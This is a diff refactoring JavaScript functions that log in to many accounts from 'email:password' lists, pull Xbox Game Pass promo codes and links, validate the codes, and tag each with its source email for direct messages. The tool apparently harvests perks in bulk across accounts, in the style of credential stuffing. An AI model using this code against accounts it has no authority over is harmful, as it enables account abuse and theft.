     return { fetchResults, validateResults };
@@ -711,34 +680,24 @@ async function pullCodes(accounts, onProgress, signal) {
 
   if (onProgress) onProgress("validate_start", { total: allCodes.length, fetchResults });
 
-  // checkCodes wants raw code strings; we re-attach sourceEmail after.
   const codeIndex = new Map();
-  allCodes.forEach((entry, i) => codeIndex.set(entry.code, entry.sourceEmail));
+  allCodes.forEach((entry) => codeIndex.set(entry.code, entry.sourceEmail));
 
   const validateResults = await checkCodes(wlids, allCodes.map(c => c.code), 10, (done, total, lastResult) => {
     if (onProgress) onProgress("validate", { done, total, status: lastResult?.status });
   }, signal);
 
-  // Attach source email so DMs can show "code | title | from email"
-  for (const r of validateResults) {
-    r.sourceEmail = codeIndex.get(r.code) || "";
-  }
-
+  for (const r of validateResults) r.sourceEmail = codeIndex.get(r.code) || "";
   return { fetchResults, validateResults };
 }
 
-/**
- * Pull links only (promo links from Game Pass perks). No validation phase.
- * Controlled concurrency — 3 workers, retry queue, no silent skips.
- * Each link carries `sourceEmail` for DM attribution.
- */
 async function pullLinks(accounts, onProgress, signal) {
   const parsed = accounts.map((a) => {
     const i = a.indexOf(":");
     return i === -1 ? { email: a, password: "" } : { email: a.substring(0, i), password: a.substring(i + 1) };
   });
 
-  const allLinks = []; // [{ link, sourceEmail }]
+  const allLinks = [];
   const fetchResults = [];
 
   await runQueue({
@@ -748,10 +707,7 @@ async function pullLinks(accounts, onProgress, signal) {
     signal,
     runner: async ({ email, password }, attempt) => {
       const result = await fetchFromAccount(email, password);
-      const transient =
-        result.error === "OAuth failed" ||
-        result.error === "Xbox tokens failed";
-      if (transient && attempt < 2) return { retry: true };
+      if (isTransient(result.error) && attempt < 2) return { retry: true };
 
       const links = result.links || [];
       fetchResults.push({ email: result.email, links, error: result.error });
@@ -759,11 +715,8 @@ async function pullLinks(accounts, onProgress, signal) {
 
       if (onProgress) {
         onProgress("fetch", {
-          email,
-          links: links.length,
-          error: result.error,
-          done: fetchResults.length,
-          total: parsed.length,
+          email, links: links.length, error: result.error,
+          done: fetchResults.length, total: parsed.length,
         });
       }
       return { result };
